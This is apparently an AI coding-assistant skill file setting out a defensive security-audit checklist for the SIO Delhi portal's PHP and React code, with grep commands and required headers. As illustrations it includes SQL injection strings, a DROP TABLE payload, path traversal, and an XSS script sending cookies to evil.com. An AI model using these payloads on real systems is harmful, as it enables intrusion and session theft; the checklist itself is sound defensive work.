---
name: security-audit
description: Security guardrails for the SIO Delhi portal. Use whenever writing or modifying PHP endpoints, API routes, file upload handlers, SQL queries, or user-facing components that render user-generated content. Also use when reviewing code for security issues.
argument-hint: [area-to-audit]
---

# Security Guardrails

These rules apply to ALL portal development. When writing or reviewing code, check every change against these rules. When explicitly asked to audit, run the full checklist with file:line references.

## 1. SQL Injection
**How it's exploited:** Attacker enters `' OR 1=1 --` as phone number. If query uses string concatenation (`"WHERE phone = '$phone'"`) instead of prepared statements, attacker dumps entire users table or destroys data with `'; DROP TABLE portal_users; --`.

**What to check:**
- Search every `.php` file for `$_GET`, `$_POST`, `$_REQUEST` used directly in SQL strings
- Every query must use `$pdo->prepare()` with `?` placeholders
- Check dynamic ORDER BY, LIMIT, table names (can't use placeholders — must whitelist)

```bash
# Find potential SQL injection points
grep -rn '\$_GET\|\$_POST\|\$_REQUEST' api/ --include="*.php" | grep -i 'select\|insert\|update\|delete\|where'
```

## 2. XSS (Cross-Site Scripting)
**How it's exploited:** Attacker sets name to `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. When admin views member list, script runs in admin's browser stealing their Clerk session.

**What to check:**
- Search for `dangerouslySetInnerHTML` and `innerHTML` in React code
- Check if PHP returns raw user input in any HTML response
- React JSX auto-escapes `{variable}` but bypasses exist

```bash
grep -rn 'dangerouslySetInnerHTML\|innerHTML' src/ --include="*.tsx" --include="*.ts"
```

## 3. CSRF (Cross-Site Request Forgery)
**How it's exploited:** Attacker sends admin link to page with hidden form that auto-submits to API. If API uses cookies, admin's browser sends cookie automatically.

**Why we should be safe:** Clerk JWT via `Authorization: Bearer` header, not cookies. Verify no endpoint falls back to cookie auth.

```bash
grep -rn 'cookie\|session_start\|$_COOKIE\|$_SESSION' api/ --include="*.php"
```

## 4. Auth Bypass
**How it's exploited:** Attacker calls `DELETE /api/portal/users/ADMIN_ID` with no token or a member-role token. If endpoint doesn't verify JWT or check role, any user can delete the admin.

**What to check:**
- Every route in `api/index.php` must call auth verification
- Test: no token → 401, wrong role → 403, tampered JWT → 401

```bash
# Find routes that might skip auth
grep -rn 'function portal' api/routes/portal.php | head -30
```

## 5. IDOR (Insecure Direct Object Reference)
**How it's exploited:** Member A calls `GET /api/portal/users/MEMBER_B_ID/messages` to read B's private messages. API accepts any UUID without checking caller's permission scope.

**What to check:**
- Every endpoint taking a user/unit/message ID must verify the caller has permission to access that specific resource
- Not just role check — scope check (their unit, their region)

## 6. File Upload Vulnerabilities
**How it's exploited:** Attacker uploads `avatar.php` as profile photo. If server saves to `/uploads/avatars/avatar.php` and directory executes PHP, attacker gets remote code execution. Also: path traversal with `../../../.env` filename.

**What to check:**
- Validate file extension AND MIME type
- Save with generated UUID filename, never original
- Upload directory must have `php_flag engine off` in `.htaccess`
- Limit file size (2MB for avatars)
- Strip `../` from filenames

```bash
grep -rn 'move_uploaded_file\|$_FILES\|upload' api/ --include="*.php"
```

## 7. Sensitive Data Exposure
**How it's exploited:** API response includes `password` field. PHP errors in production show DB connection strings.

**What to check:**
- `formatUser()` must never return `password`
- PHP `display_errors` must be `Off` in production
- `.env` must be in `.gitignore`
- Check git history: `git log --all -p -- .env`

```bash
grep -rn "password\|secret\|api_key" api/routes/portal.php | grep -v "password_hash\|password_verify\|reset.*password"
```

## 8. Broken Access Control (Vertical)
**How it's exploited:** Unit president calls assign-title endpoint with `level: "zonal"` to escalate privileges. Regional president calls revoke endpoint (admin/zonal only).

**What to check:** Every write endpoint checks caller's role server-side. Frontend hiding buttons is NOT security.

## 9. HTTP Security Headers
**How it's exploited:** Without `X-Frame-Options: DENY` → clickjacking. Without `X-Content-Type-Options: nosniff` → MIME confusion attacks. Without HSTS → SSL stripping on public WiFi.

**What to check:**
```bash
curl -I https://api.siodelhi.org/api/health 2>/dev/null | grep -iE 'x-frame|x-content|strict-transport|content-security'
```

**Required headers:**
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`
- `Strict-Transport-Security: max-age=31536000`
- `Content-Security-Policy: default-src 'self'`

## 10. Rate Limiting
**How it's exploited:** Attacker brute-forces default passwords (firstname + last 4 digits — very guessable) with 10,000 attempts in 5 minutes.

**What to check:** Login endpoint rate-limited to ~10 attempts/minute per IP. API returns `429 Too Many Requests` when exceeded.

## 11. Dependency Vulnerabilities
```bash
npm audit --production
```
Check for critical/high severity CVEs. Pin versions, review deps with > 1 year since update.

## Output Format
For each check, report:
```
[PASS/FAIL/WARNING] Category — file:line — Description
```
